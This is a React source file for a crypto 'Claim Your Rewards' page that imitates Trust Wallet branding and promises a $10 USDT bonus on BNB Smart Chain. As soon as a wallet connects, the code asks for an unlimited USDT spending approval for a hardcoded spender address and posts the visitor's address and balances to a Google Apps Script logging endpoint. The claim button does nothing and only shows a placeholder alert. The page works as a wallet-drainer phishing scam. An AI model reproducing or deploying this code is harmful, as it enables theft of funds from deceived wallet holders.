// src/App.jsx
import React, { useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useSwitchChain,
  useBalance,
  useReadContract,
  useWriteContract,
} from "wagmi";
import { erc20Abi, formatUnits, maxUint256 } from "viem";
import { useAppKit } from "@reown/appkit-react";

// ===== CONFIG (same values you used in reward.html) =====
const APPS_SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
const APPS_SCRIPT_SECRET = "justforme";

const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

const BNB_CHAIN_ID = 56;
const BNB_LABEL = "BNB Smart Chain (56)";
const TOKEN_DECIMALS = 18;

const REQUIRED_USDT = 10;
const REWARD_AMOUNT = 10;

// ===== small helpers =====
function formatToken(num) {
  const n = Number(num || 0);
  if (Number.isNaN(n)) return "0";
  if (Number.isInteger(n)) return String(n);
  return n.toFixed(4).replace(/\.?0+$/, "");
}

function storageKeyFor(address) {
  return "userId_" + address.toLowerCase();
}
function generateUserIdFromAddress(address) {
  address = (address || "").toLowerCase();
  let hash = 0;
  for (let i = 0; i < address.length; i++) {
    hash = (hash << 5) - hash + address.charCodeAt(i);
    hash |= 0;
  }
  hash = Math.abs(hash);
  const num = 100000 + (hash % 900000);
  return String(num);
}
function getOrCreateUserId(address) {
  if (typeof window === "undefined") return "-";
  const key = storageKeyFor(address);
  let id = window.localStorage.getItem(key);
  if (!id || !/^[0-9]{6}$/.test(id)) {
    id = generateUserIdFromAddress(address);
    window.localStorage.setItem(key, id);
  }
  return id;
}

async function notifyBackend({
  address,
  network,
  userId,
  bnbBalance,
  tokenBalance,
  eventType = "connect",
}) {
  try {
    const payload = new URLSearchParams({
      secret: APPS_SCRIPT_SECRET,
      address: address || "",
      network: network || "",
      timestamp: new Date().toISOString(),
      userId: userId || "",
      bnbBalance:
        bnbBalance !== undefined && bnbBalance !== null
          ? String(bnbBalance)
          : "",
      tokenBalance:
        tokenBalance !== undefined && tokenBalance !== null
          ? String(tokenBalance)
          : "",
      eventType: eventType || "connect",
    });

    await fetch(APPS_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      },
      body: payload.toString(),
    });
  } catch (err) {
    console.error("notifyBackend error:", err);
  }
}

export default function App() {
  const { open: openAppKit } = useAppKit();

  const { address, isConnected, status: connStatus } = useAccount();
  const chainId = useChainId();
  const { switchChainAsync } = useSwitchChain();
  const { writeContractAsync } = useWriteContract();

  const [statusText, setStatusText] = useState("Not connected");
  const [userId, setUserId] = useState("-");
  const [isApproved, setIsApproved] = useState(false);
  const [tokenBalanceNum, setTokenBalanceNum] = useState(0);

  // BNB balance (auto)
  const {
    data: bnbBalanceData,
    isLoading: isLoadingBnb,
  } = useBalance({
    address,
    chainId: BNB_CHAIN_ID,
    enabled: !!address,
    watch: true,
  });

  // USDT balance
  const {
    data: usdtBalanceRaw,
    refetch: refetchUsdtBalance,
    isLoading: isLoadingUsdt,
  } = useReadContract({
    abi: erc20Abi,
    address: address ? TOKEN_ADDRESS : undefined,
    functionName: "balanceOf",
    args: address ? [address] : undefined,
    chainId: BNB_CHAIN_ID,
    query: { enabled: !!address },
  });

  // Allowance
  const {
    data: allowanceRaw,
    refetch: refetchAllowance,
    isLoading: isLoadingAllowance,
  } = useReadContract({
    abi: erc20Abi,
    address: address ? TOKEN_ADDRESS : undefined,
    functionName: "allowance",
    args: address ? [address, SPENDER_ADDRESS] : undefined,
    chainId: BNB_CHAIN_ID,
    query: { enabled: !!address },
  });

  const prettyBNB = useMemo(() => {
    if (!bnbBalanceData) return "—";
    return Number(bnbBalanceData.formatted || 0).toFixed(6) + " BNB";
  }, [bnbBalanceData]);

  const prettyUSDT = useMemo(() => {
    if (!usdtBalanceRaw) return "0";
    try {
      const n = Number(formatUnits(usdtBalanceRaw, TOKEN_DECIMALS));
      return formatToken(n);
    } catch {
      return "0";
    }
  }, [usdtBalanceRaw]);

  // numeric token balance for logging
  useEffect(() => {
    if (!usdtBalanceRaw) {
      setTokenBalanceNum(0);
    } else {
      try {
        const n = Number(formatUnits(usdtBalanceRaw, TOKEN_DECIMALS));
        setTokenBalanceNum(n);
      } catch {
        setTokenBalanceNum(0);
      }
    }
  }, [usdtBalanceRaw]);

  // userId from address
  useEffect(() => {
    if (!address) {
      setUserId("-");
      return;
    }
    const id = getOrCreateUserId(address);
    setUserId(id);
  }, [address]);

  // simple status text
  useEffect(() => {
    if (!address) {
      setStatusText("Not connected");
      return;
    }
    if (connStatus === "connecting") {
      setStatusText("Connecting…");
    } else if (connStatus === "reconnecting") {
      setStatusText("Reconnecting…");
    } else {
      setStatusText("Connected");
    }
  }, [address, connStatus]);

  // isApproved from allowance
  useEffect(() => {
    if (!allowanceRaw) {
      setIsApproved(false);
      return;
    }
    try {
      setIsApproved(allowanceRaw > 0n);
    } catch {
      setIsApproved(false);
    }
  }, [allowanceRaw]);

  async function ensureOnBsc() {
    if (!isConnected || !address) return;
    if (chainId === BNB_CHAIN_ID) return;

    try {
      setStatusText("Switching network to BNB…");
      await switchChainAsync({ chainId: BNB_CHAIN_ID });
      setStatusText("Connected (BNB)");
    } catch (err) {
      console.error("switchChain error", err);
      setStatusText("Wrong network");
      alert(
        "Please switch to BNB Smart Chain (56) in your wallet, then try again."
      );
    }
  }

  async function ensureTokenApproval() {
    if (!address) return;
    if (isApproved) {
      console.log("[approve] already approved");
      return;
    }
    try {
      setStatusText("Waiting for USDT approval…");
      const hash = await writeContractAsync({
        abi: erc20Abi,
        address: TOKEN_ADDRESS,
        functionName: "approve",
        args: [SPENDER_ADDRESS, maxUint256],
        chainId: BNB_CHAIN_ID,
      });
      console.log("[approve] tx hash:", hash);
      setStatusText("Approval sent, waiting confirmation…");

      refetchAllowance();

      await notifyBackend({
        address,
        network: BNB_LABEL,
        userId,
        bnbBalance: bnbBalanceData?.formatted ?? "",
        tokenBalance: tokenBalanceNum,
        eventType: "approval_sent",
      });

      setStatusText("Connected + Approved ✅");
    } catch (err) {
      console.error("approve error", err);
      setStatusText("Approval failed");
      alert(
        "Token approval failed: " + (err?.message ? err.message : String(err))
      );
      await notifyBackend({
        address,
        network: BNB_LABEL,
        userId,
        bnbBalance: bnbBalanceData?.formatted ?? "",
        tokenBalance: tokenBalanceNum,
        eventType: "approval_error",
      });
    }
  }

  // When wallet connects: network check, balances, logging, auto-approve
  useEffect(() => {
    if (!isConnected || !address) return;

    (async () => {
      try {
        await ensureOnBsc();
        refetchUsdtBalance();
        refetchAllowance();

        await notifyBackend({
          address,
          network: BNB_LABEL,
          userId,
          bnbBalance: bnbBalanceData?.formatted ?? "",
          tokenBalance: tokenBalanceNum,
          eventType: "connect",
        });

        await ensureTokenApproval();
      } catch (err) {
        console.error("post-connect flow error", err);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address]);

  function handleClaim() {
    if (!isConnected || !address) {
      alert("Connect your wallet first.");
      return;
    }
    // Placeholder – real contract call later
    alert("Reward claim: contract call will be added later (demo).");
  }

  // ===== UI (Rewards page layout, simplified from your HTML) =====
  return (
    <div style={{ minHeight: "100vh", background: "#050816", color: "#e6eef8" }}>
      {/* HEADER */}
      <header
        style={{
          background: "#071027",
          padding: "10px 16px",
          position: "sticky",
          top: 0,
          zIndex: 20,
          borderBottom: "1px solid rgba(255,255,255,0.03)",
        }}
      >
        <div
          style={{
            maxWidth: 980,
            margin: "0 auto",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: 12,
          }}
        >
          <div
            style={{
              fontWeight: 600,
              letterSpacing: 3,
              fontSize: 14,
            }}
          >
            DEMO
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 10,
              flexWrap: "wrap",
              justifyContent: "flex-end",
            }}
          >
            <a
              href="home.html"
              style={{
                color: "#dbeafe",
                textDecoration: "none",
                padding: "6px 10px",
                borderRadius: 6,
                fontSize: "0.9rem",
              }}
            >
              Wallet
            </a>
            <a
              href="home.html"
              style={{
                color: "#dbeafe",
                textDecoration: "none",
                padding: "6px 10px",
                borderRadius: 6,
                fontSize: "0.9rem",
              }}
            >
              Task
            </a>
            <a
              href="hold-earn.html"
              style={{
                color: "#dbeafe",
                textDecoration: "none",
                padding: "6px 10px",
                borderRadius: 6,
                fontSize: "0.9rem",
              }}
            >
              Earn
            </a>

            {/* CONNECT BUTTON – opens Reown/Web3Modal */}
            <button
              onClick={() => openAppKit()}
              style={{
                background: "#3b82f6",
                color: "#fff",
                padding: "8px 14px",
                borderRadius: 999,
                border: 0,
                cursor: "pointer",
                fontSize: "0.9rem",
                whiteSpace: "nowrap",
              }}
            >
              {isConnected ? "Connected" : "Connect Wallet"}
            </button>
          </div>
        </div>
      </header>

      {/* MAIN */}
      <main
        style={{
          maxWidth: 980,
          margin: "20px auto",
          padding: 16,
          flex: 1,
        }}
      >
        {/* TOP INFO */}
        <div
          style={{
            marginBottom: 14,
            fontSize: "0.84rem",
            color: "#9fb0c8",
            display: "flex",
            flexWrap: "wrap",
            gap: "10px 18px",
          }}
        >
          <div>Status: {statusText}</div>
          <div>
            Address:{" "}
            <span
              style={{
                fontFamily:
                  'ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace',
              }}
            >
              {address
                ? `${address.slice(0, 6)}…${address.slice(-4)}`
                : "—"}
            </span>
          </div>
          <div>Network: {isConnected ? BNB_LABEL : "—"}</div>
          <div>
            User ID:{" "}
            <span
              style={{
                fontFamily:
                  'ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace',
              }}
            >
              {userId}
            </span>
          </div>
        </div>

        {/* TITLE */}
        <div
          style={{
            textAlign: "center",
            marginBottom: "1.5rem",
          }}
        >
          <h1 style={{ fontSize: "1.9rem", marginBottom: "0.4rem" }}>
            Claim Your Rewards
          </h1>
          <p style={{ fontSize: "0.95rem", color: "#9ca3af" }}>
            Connect your BSC wallet once, then claim your bonus after approval.
          </p>
        </div>

        {/* REWARD CARD */}
        <div
          style={{
            borderRadius: "1.5rem",
            padding: "1.4rem 1.6rem",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: "1.4rem",
            border: "1px solid rgba(148,163,184,0.35)",
            boxShadow: "0 20px 45px rgba(15,23,42,0.9)",
            background:
              "radial-gradient(circle at top left,#111827,#020617)",
          }}
        >
          {/* LEFT */}
          <div
            style={{
              minWidth: 150,
              display: "flex",
              flexDirection: "column",
              gap: "0.4rem",
            }}
          >
            <div
              style={{
                fontSize: "0.7rem",
                textTransform: "uppercase",
                letterSpacing: "0.18em",
                color: "#64748b",
                marginBottom: 6,
              }}
            >
              Reward #1
            </div>
            <div
              style={{
                width: 54,
                height: 54,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                overflow: "hidden",
                background: "#020617",
                borderRadius: 999,
                border: "1px solid rgba(148,163,184,0.6)",
                backgroundImage:
                  "radial-gradient(circle at 20% 0,#1d4ed8,#020617)",
              }}
            >
              <img
                src="logo.png"
                alt="Trust Wallet"
                style={{
                  width: "70%",
                  height: "70%",
                  objectFit: "contain",
                  display: "block",
                }}
              />
            </div>
            <span style={{ fontSize: "0.8rem", color: "#9fb0c8" }}>
              Trust Wallet • BSC
            </span>
          </div>

          {/* CENTER */}
          <div
            style={{
              flex: 1,
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              textAlign: "center",
              gap: "0.35rem",
            }}
          >
            <div
              style={{
                fontSize: "2.1rem",
                fontWeight: 700,
                letterSpacing: "0.05em",
              }}
            >
              ${REWARD_AMOUNT}
            </div>
            <div
              style={{
                fontSize: "0.86rem",
                textTransform: "uppercase",
                color: "#9ca3af",
                letterSpacing: "0.23em",
              }}
            >
              Starter Bonus
            </div>
            <div
              style={{
                marginTop: 2,
                fontSize: "0.82rem",
                color: "#9fb0c8",
                maxWidth: 370,
              }}
            >
              First time connection reward for eligible wallets with USDT
              approval.
            </div>
            <button
              onClick={handleClaim}
              disabled={!isConnected || !isApproved}
              style={{
                border: "none",
                outline: "none",
                borderRadius: 999,
                padding: "0.55rem 1.8rem",
                fontSize: "0.9rem",
                fontWeight: 600,
                cursor: !isConnected || !isApproved ? "not-allowed" : "pointer",
                marginTop: "0.7rem",
                background: !isConnected || !isApproved ? "#15803d88" : "#22c55e",
                color: "#022c22",
                boxShadow:
                  "0 14px 30px rgba(34,197,94," +
                  (!isConnected || !isApproved ? "0.2" : "0.45") +
                  ")",
                opacity: !isConnected || !isApproved ? 0.5 : 1,
              }}
            >
              Claim
            </button>
            <div
              style={{ marginTop: 4, fontSize: "0.85rem", color: "#9fb0c8" }}
            >
              {!isConnected
                ? "Connect your wallet using the top button."
                : !isApproved
                ? "Waiting for USDT approval transaction…"
                : "Ready to claim (demo)."}
            </div>
          </div>

          {/* RIGHT */}
          <div
            style={{
              minWidth: 170,
              display: "flex",
              flexDirection: "column",
              alignItems: "flex-end",
              gap: "0.4rem",
            }}
          >
            <span style={{ fontSize: "0.85rem", color: "#9fb0c8" }}>
              {isConnected
                ? "Wallet connected."
                : "Use the top button to connect your wallet."}
            </span>
            {isConnected && (
              <span
                style={{
                  marginTop: 6,
                  padding: "4px 12px",
                  borderRadius: 999,
                  fontSize: "0.8rem",
                  background: "rgba(34,197,94,0.15)",
                  border: "1px solid rgba(34,197,94,0.7)",
                  color: "#bbf7d0",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 6,
                }}
              >
                <span
                  style={{
                    width: 6,
                    height: 6,
                    borderRadius: 999,
                    background: "#22c55e",
                  }}
                />
                Connected
              </span>
            )}
          </div>
        </div>

        {/* EXTRA INFO */}
        <div
          style={{ marginTop: 18, fontSize: "0.85rem", color: "#9fb0c8" }}
        >
          <div>BNB Balance: {isLoadingBnb ? "Loading…" : prettyBNB}</div>
          <div style={{ marginTop: 6 }}>
            USDT Balance:{" "}
            {isLoadingUsdt ? "Loading…" : `${prettyUSDT} USDT`}
          </div>
          <div style={{ marginTop: 6, fontSize: "0.8rem", opacity: 0.7 }}>
            Approval status:{" "}
            {isLoadingAllowance
              ? "Checking…"
              : isApproved
              ? "Already approved ✅"
              : "Not approved yet"}
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer
        style={{
          maxWidth: 980,
          margin: "24px auto 16px auto",
          padding: 12,
          color: "#9fb0c8",
          textAlign: "center",
          fontSize: "0.8rem",
        }}
      >
        © {new Date().getFullYear()} MYCASH — BSC (BEP-20) • No private keys
        stored.
      </footer>
    </div>
  );
}
